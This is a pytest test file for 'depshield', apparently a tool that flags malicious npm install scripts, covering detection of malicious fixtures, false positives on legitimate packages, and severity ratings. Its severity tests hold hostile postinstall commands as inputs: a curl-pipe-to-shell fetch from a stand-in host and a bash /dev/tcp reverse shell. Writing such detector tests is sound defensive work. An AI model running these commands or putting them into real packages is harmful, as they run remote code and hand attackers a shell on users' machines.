"""Tests for install script analyzer."""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from depshield.analyzers.install_scripts import InstallScriptAnalyzer
from depshield.core.models import FindingCategory, PackageInfo, Severity
from tests.conftest import (
    LEGITIMATE_DIR,
    MALICIOUS_DIR,
    fixture_to_package,
    make_package,
)


@pytest.fixture
def analyzer():
    return InstallScriptAnalyzer()


# ------------------------------------------------------------------ #
# Malicious fixture detection                                         #
# ------------------------------------------------------------------ #

class TestMaliciousDetection:
    """Each malicious fixture must produce at least one finding."""

    def test_reverse_shell_detected(self, analyzer):
        pkg = fixture_to_package(MALICIOUS_DIR / "reverse_shell.json")
        findings = analyzer.analyze(pkg)
        assert len(findings) >= 1
        # Should detect /dev/tcp or child_process
        titles = " ".join(f.title for f in findings).lower()
        assert any(k in titles for k in ["tcp", "child_process", "exec"])

    def test_reverse_shell_severity_critical_or_high(self, analyzer):
        pkg = fixture_to_package(MALICIOUS_DIR / "reverse_shell.json")
        findings = analyzer.analyze(pkg)
        severities = {f.severity for f in findings}
        assert Severity.CRITICAL in severities or Severity.HIGH in severities

    def test_credential_stealer_detected(self, analyzer):
        pkg = fixture_to_package(MALICIOUS_DIR / "credential_stealer.json")
        findings = analyzer.analyze(pkg)
        assert len(findings) >= 1

    def test_credential_stealer_finds_network_or_fs(self, analyzer):
        pkg = fixture_to_package(MALICIOUS_DIR / "credential_stealer.json")
        findings = analyzer.analyze(pkg)
        combined = " ".join(f.evidence + " " + f.title for f in findings).lower()
        assert any(k in combined for k in [
            "readfile", "https", "request", "url", ".ssh", ".npmrc",
        ])

    def test_crypto_miner_detected(self, analyzer):
        pkg = fixture_to_package(MALICIOUS_DIR / "crypto_miner.json")
        findings = analyzer.analyze(pkg)
        assert len(findings) >= 1
        # curl | bash is critical
        has_critical = any(f.severity == Severity.CRITICAL for f in findings)
        assert has_critical, "curl|bash should be CRITICAL"

    def test_data_exfil_detected(self, analyzer):
        pkg = fixture_to_package(MALICIOUS_DIR / "data_exfil.json")
        findings = analyzer.analyze(pkg)
        assert len(findings) >= 1

    def test_base64_eval_detected(self, analyzer):
        pkg = fixture_to_package(MALICIOUS_DIR / "base64_eval.json")
        findings = analyzer.analyze(pkg)
        assert len(findings) >= 1
        titles = " ".join(f.title for f in findings).lower()
        assert any(k in titles for k in ["eval", "base64", "buffer"])

    def test_env_stealer_detected(self, analyzer):
        pkg = fixture_to_package(MALICIOUS_DIR / "env_stealer.json")
        findings = analyzer.analyze(pkg)
        assert len(findings) >= 1

    def test_worm_propagation_detected(self, analyzer):
        pkg = fixture_to_package(MALICIOUS_DIR / "worm_propagation.json")
        findings = analyzer.analyze(pkg)
        assert len(findings) >= 1

    def test_c2_beacon_detected(self, analyzer):
        pkg = fixture_to_package(MALICIOUS_DIR / "c2_beacon.json")
        findings = analyzer.analyze(pkg)
        assert len(findings) >= 1
        titles = " ".join(f.title for f in findings).lower()
        assert any(k in titles for k in ["eval", "url", "https"])

    def test_all_findings_have_correct_category(self, analyzer):
        for fixture in MALICIOUS_DIR.glob("*.json"):
            pkg = fixture_to_package(fixture)
            for finding in analyzer.analyze(pkg):
                assert finding.category == FindingCategory.INSTALL_SCRIPT


# ------------------------------------------------------------------ #
# False positive prevention                                           #
# ------------------------------------------------------------------ #

class TestLegitimateNotFlagged:
    """Legitimate packages must NOT be flagged."""

    def test_express_not_flagged(self, analyzer):
        pkg = fixture_to_package(LEGITIMATE_DIR / "express.json")
        findings = analyzer.analyze(pkg)
        assert len(findings) == 0

    def test_react_not_flagged(self, analyzer):
        pkg = fixture_to_package(LEGITIMATE_DIR / "react.json")
        findings = analyzer.analyze(pkg)
        assert len(findings) == 0

    def test_webpack_build_script_not_flagged(self, analyzer):
        pkg = fixture_to_package(LEGITIMATE_DIR / "webpack.json")
        findings = analyzer.analyze(pkg)
        assert len(findings) == 0

    def test_typescript_not_flagged(self, analyzer):
        pkg = fixture_to_package(LEGITIMATE_DIR / "typescript.json")
        findings = analyzer.analyze(pkg)
        assert len(findings) == 0

    def test_node_gyp_rebuild_not_flagged(self, analyzer):
        pkg = make_package(
            name="bcrypt",
            scripts={"postinstall": "node-gyp rebuild"},
        )
        findings = analyzer.analyze(pkg)
        assert len(findings) == 0

    def test_prebuild_install_not_flagged(self, analyzer):
        pkg = make_package(
            name="sharp",
            scripts={"postinstall": "prebuild-install || node-gyp rebuild"},
        )
        findings = analyzer.analyze(pkg)
        assert len(findings) == 0

    def test_husky_install_not_flagged(self, analyzer):
        pkg = make_package(
            name="my-app",
            scripts={"postinstall": "husky install"},
        )
        findings = analyzer.analyze(pkg)
        assert len(findings) == 0

    def test_tsc_build_not_flagged(self, analyzer):
        pkg = make_package(
            name="my-lib",
            scripts={"postinstall": "tsc"},
        )
        findings = analyzer.analyze(pkg)
        assert len(findings) == 0

    def test_empty_scripts_not_flagged(self, analyzer):
        pkg = make_package(name="simple", scripts={})
        findings = analyzer.analyze(pkg)
        assert len(findings) == 0

    def test_no_scripts_not_flagged(self, analyzer):
        pkg = make_package(name="minimal")
        findings = analyzer.analyze(pkg)
        assert len(findings) == 0

    def test_webpack_mode_production_not_flagged(self, analyzer):
        pkg = make_package(
            name="my-bundle",
            scripts={"postinstall": "webpack --mode production"},
        )
        findings = analyzer.analyze(pkg)
        assert len(findings) == 0

    def test_patch_package_not_flagged(self, analyzer):
        pkg = make_package(
            name="patched",
            scripts={"postinstall": "patch-package"},
        )
        findings = analyzer.analyze(pkg)
        assert len(findings) == 0

    def test_echo_not_flagged(self, analyzer):
        pkg = make_package(
            name="verbose",
            scripts={"postinstall": "echo"},
        )
        findings = analyzer.analyze(pkg)
        assert len(findings) == 0

    def test_non_install_scripts_ignored(self, analyzer):
        """Scripts like 'start', 'test', 'build' are not install hooks."""
        pkg = make_package(
            name="normal",
            scripts={
                "start": "node server.js",
                "test": "jest --coverage",
                "build": "webpack",
            },
        )
        findings = analyzer.analyze(pkg)
        assert len(findings) == 0


# ------------------------------------------------------------------ #
# Severity accuracy                                                   #
# ------------------------------------------------------------------ #

class TestSeverityAccuracy:
    """Verify severity classification is reasonable."""

    def test_curl_pipe_bash_is_critical(self, analyzer):
        pkg = make_package(
            scripts={"postinstall": "curl https://evil.test.invalid/x | sh"}
        )
        findings = analyzer.analyze(pkg)
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_eval_is_high(self, analyzer):
        pkg = make_package(
            scripts={"postinstall": "node -e \"eval('malicious code')\""}
        )
        findings = analyzer.analyze(pkg)
        assert any(f.severity >= Severity.MEDIUM for f in findings)

    def test_dev_tcp_is_critical(self, analyzer):
        pkg = make_package(
            scripts={"postinstall": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}
        )
        findings = analyzer.analyze(pkg)
        assert any(f.severity == Severity.CRITICAL for f in findings)
